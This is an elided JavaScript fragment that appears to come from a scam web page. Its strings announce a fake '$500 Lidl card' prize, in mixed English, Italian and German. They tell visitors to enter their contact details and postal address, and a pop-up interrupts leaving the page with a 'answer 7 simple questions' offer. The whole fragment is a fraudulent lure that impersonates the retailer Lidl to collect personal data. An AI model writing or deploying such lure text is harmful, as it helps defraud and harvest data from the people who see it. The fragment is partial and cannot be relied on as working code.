...
(function () {
  ...
  function onDOMContentLoaded() {
    ...
    var takeitessage = '<div>Your <span class="marked">$500 Lidl card</span> è stato prenotato da Lidl!</div><br><br>1. Geben Sie auf der nächsten Seite Ihre Kontaktdaten und Ihre Postanschrift ein.<br>2. Ihre Lidl-Karte wird innerhalb von 10-14 Werktagen versendet.</div>';
    ...
    var logomessage = '<div class="text-center"><center>Wait!</div><br>Before going back to home page, answer 7 simple questions and get a chance to win</center></div>';
